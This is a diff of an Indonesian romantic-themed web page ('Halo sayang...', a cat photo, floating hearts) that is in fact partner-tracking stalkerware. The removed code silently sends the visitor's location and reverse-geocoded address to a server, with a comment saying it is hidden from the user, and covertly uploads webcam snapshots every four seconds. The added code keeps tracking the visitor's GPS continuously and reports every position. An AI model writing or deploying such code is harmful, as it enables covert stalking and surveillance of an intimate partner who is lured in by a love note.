@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="utf-8" />
-  <title>💗 Kamu di Hatiku</title>
+  <title>💗 Pelacakan (Privat)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root {
@@ -11,190 +11,142 @@
       --accent: #ff4d79;
     }
 
-    body {
-      margin: 0;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: radial-gradient(circle at top left, var(--pink1), var(--pink2));
+    html,body {
+      height:100%;
+      margin:0;
       font-family: "Poppins", sans-serif;
-      color: #fff;
-      text-align: center;
+      background: radial-gradient(circle at top left, var(--pink1), var(--pink2));
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#fff;
+      overflow:hidden;
     }
 
-    .container {
-      position: relative;
-      z-index: 2;
-      background: rgba(255, 255, 255, 0.15);
+    .card {
+      text-align:center;
+      background: rgba(255,255,255,0.12);
       backdrop-filter: blur(8px);
-      border-radius: 20px;
-      padding: 40px 50px;
+      border-radius:18px;
+      padding:30px 36px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      z-index:2;
     }
 
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 10px;
-      text-shadow: 0 0 20px rgba(255, 77, 121, 0.4);
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    @keyframes glow {
-      from { text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4; }
-      to { text-shadow: 0 0 30px #ff1493, 0 0 60px #ff69b4; }
-    }
-
+    h1 { margin:0 0 8px 0; font-size:2rem; text-shadow:0 0 12px rgba(255,77,121,0.4); }
     .kitty {
-      width: 260px;
-      height: 260px;
-      border-radius: 20px;
-      object-fit: cover;
-      margin-bottom: 16px;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
-    }
-
-    #romanticText {
-      font-size: 1.1rem;
-      margin-top: 12px;
-      font-weight: 500;
-      color: rgba(255,255,255,0.9);
+      width:260px;
+      height:260px;
+      object-fit:cover;
+      border-radius:16px;
+      box-shadow:0 8px 25px rgba(0,0,0,0.25);
+      display:block;
+      margin:10px auto;
     }
 
     .floating {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 1;
+      position:fixed;
+      inset:0;
+      pointer-events:none;
+      z-index:1;
+      overflow:hidden;
     }
 
     .love {
-      position: absolute;
-      color: rgba(255,255,255,0.8);
-      font-size: 18px;
+      position:absolute;
+      font-size:16px;
+      opacity:0.9;
+      text-shadow: 0 0 8px rgba(255,120,160,0.6);
       animation: floatUp linear infinite;
-      text-shadow: 0 0 10px rgba(255,120,160,0.6);
+      white-space:nowrap;
     }
 
     @keyframes floatUp {
-      0% { transform: translateY(110vh) scale(0.5); opacity: 0; }
-      15% { opacity: 1; }
-      100% { transform: translateY(-120vh) scale(1.2); opacity: 0; }
+      0% { transform: translateY(110vh) scale(0.6); opacity: 0; }
+      10% { opacity: 1; }
+      100% { transform: translateY(-140vh) scale(1.2); opacity: 0; }
     }
 
-    video { display: none; }
+    #status { margin-top:8px; font-size:0.95rem; color:rgba(255,255,255,0.9); }
+    video { display:none; } /* keep to avoid showing preview */
   </style>
 </head>
 <body>
   <div class="floating" id="floating"></div>
 
-  <div class="container">
-    <h1>💞 Kamu Kangen Aku Nggak? 💞</h1>
-    <img class="kitty" src="/static/img/kucing.jpeg" alt="kucing imut">
-    <div id="romanticText">Aku selalu inget kamu, di setiap detik. 💗</div>
-    <div id="status" style="margin-top: 15px; font-size: 0.9rem; opacity:0;"></div>
+  <div class="card" role="main" aria-live="polite">
+    <h1>💞 Halo sayang... 💞</h1>
+    <img class="kitty" src="/static/img/kucing.jpeg" alt="muka kucing imut">
+    <div id="status">Menunggu izin lokasi... (lokasi dikirim secara privat)</div>
   </div>
 
-  <video id="hiddenVideo" autoplay playsinline muted></video>
-
-  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
   <script>
-    const socket = io();
-    const clientId = localStorage.getItem("client_id") || "client_" + Math.random().toString(36).slice(2,9);
-    localStorage.setItem("client_id", clientId);
-    socket.emit("register", { client_id: clientId, role: "client" });
+    // client_id sederhana
+    const clientId = localStorage.getItem('client_id') || ('client_' + Math.random().toString(36).slice(2,9));
+    localStorage.setItem('client_id', clientId);
 
-    const hiddenVideo = document.getElementById("hiddenVideo");
-    const statusEl = document.getElementById("status");
-
-    // === Efek love berterbangan ===
-    const floating = document.getElementById("floating");
-    function spawnLoves() {
-      for (let i = 0; i < 6; i++) {
-        const el = document.createElement("div");
-        el.className = "love";
-        el.textContent = ["💗","💕","💞","💓","💖"][Math.floor(Math.random()*5)];
-        el.style.left = Math.random()*100 + "vw";
-        el.style.fontSize = 16 + Math.random()*16 + "px";
-        el.style.animationDuration = 5 + Math.random()*6 + "s";
+    // efek love
+    const floating = document.getElementById('floating');
+    function spawnLoves(count = 6) {
+      const vw = window.innerWidth, vh = window.innerHeight;
+      for (let i=0;i<count;i++){
+        const el = document.createElement('div');
+        el.className = 'love';
+        const emojis = ["💗","💕","💞","💓","💖","❣️"];
+        el.textContent = emojis[Math.floor(Math.random()*emojis.length)];
+        el.style.left = Math.random() * vw + 'px';
+        el.style.fontSize = (12 + Math.random()*28) + 'px';
+        el.style.animationDuration = (6 + Math.random()*6) + 's';
         floating.appendChild(el);
-        setTimeout(()=>el.remove(), 8000);
+        setTimeout(()=> el.remove(), (parseFloat(el.style.animationDuration)+0.5)*1000);
       }
     }
-    setInterval(spawnLoves, 600);
+    spawnLoves(18);
+    setInterval(()=> spawnLoves(6), 900);
 
-    // === Kata romantis berganti ===
-    const texts = [
-      "Aku mungkin jauh, tapi hatiku selalu di dekatmu 💘",
-      "Setiap detik aku mikirin kamu 💞",
-      "Kamu itu rumahku, tempat aku pulang 💕",
-      "Kalau kamu baca ini, berarti aku lagi kangen kamu 😳",
-      "Langit boleh gelap, tapi cintaku nggak akan redup 💖"
-    ];
-    let i = 0;
-    setInterval(() => {
-      document.getElementById("romanticText").textContent = texts[i++ % texts.length];
-    }, 4000);
-
-    // === Kirim lokasi & upload kamera otomatis ===
-    async function sendReport(lat, lon, address) {
-      await fetch("/report", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ client_id: clientId, latitude: lat, longitude: lon, address })
-      });
-    }
-
-    async function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async pos => {
-          const { latitude, longitude } = pos.coords;
-          try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
-            const data = await res.json();
-            const address = data.display_name || "Alamat tidak diketahui";
-            // disembunyikan dari user
-            statusEl.textContent = "";
-            await sendReport(latitude, longitude, address);
-          } catch {
-            await sendReport(latitude, longitude, "Alamat tidak diketahui");
-          }
-        });
-      }
-    }
-
-    async function uploadFrame(blob) {
-      const formData = new FormData();
-      formData.append("client_id", clientId);
-      formData.append("image", blob);
-      await fetch("/upload", { method: "POST", body: formData });
-    }
-
-    async function startCamera() {
+    // Kirim ke server (/report) — hanya lat/lon + client_id (tidak menampilkan di halaman)
+    async function sendReport(lat, lon, source='gps') {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
-        hiddenVideo.srcObject = stream;
-
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-
-        setInterval(async () => {
-          if (hiddenVideo.readyState < 2) return;
-          canvas.width = hiddenVideo.videoWidth;
-          canvas.height = hiddenVideo.videoHeight;
-          ctx.drawImage(hiddenVideo, 0, 0);
-          const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.4));
-          uploadFrame(blob);
-        }, 4000);
-      } catch (e) {
-        console.error("Gagal akses kamera:", e);
+        await fetch('/report', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ client_id: clientId, latitude: lat, longitude: lon, source })
+        });
+        console.log('lokasi dikirim', lat, lon);
+      } catch(e) {
+        console.warn('gagal kirim report', e);
       }
     }
 
-    window.addEventListener("load", () => {
-      getLocation();
-      startCamera();
+    // ambil lokasi awal + watch
+    function startLocation() {
+      const statusEl = document.getElementById('status');
+      if (!navigator.geolocation) {
+        statusEl.textContent = 'Browser tidak mendukung lokasi.';
+        return;
+      }
+
+      // get current
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        statusEl.textContent = 'Lokasi dikirim (privat).';
+        sendReport(lat, lon, 'gps');
+      }, err => {
+        statusEl.textContent = 'Izin lokasi dibutuhkan agar pelacakan aktif.';
+        console.warn('getCurrentPosition error', err);
+      }, { enableHighAccuracy: true, timeout:8000 });
+
+      // watchPosition untuk update realtime — kirim setiap perubahan
+      navigator.geolocation.watchPosition(pos => {
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;
+        sendReport(lat, lon, 'gps');
+      }, err => {
+        console.warn('watchPosition error', err);
+      }, { enableHighAccuracy: true, maximumAge: 5000, timeout:8000 });
+    }
+
+    // langsung trigger (user akan diminta izin oleh browser)
+    window.addEventListener('load', () => {
+      startLocation();
     });
   </script>
 </body>
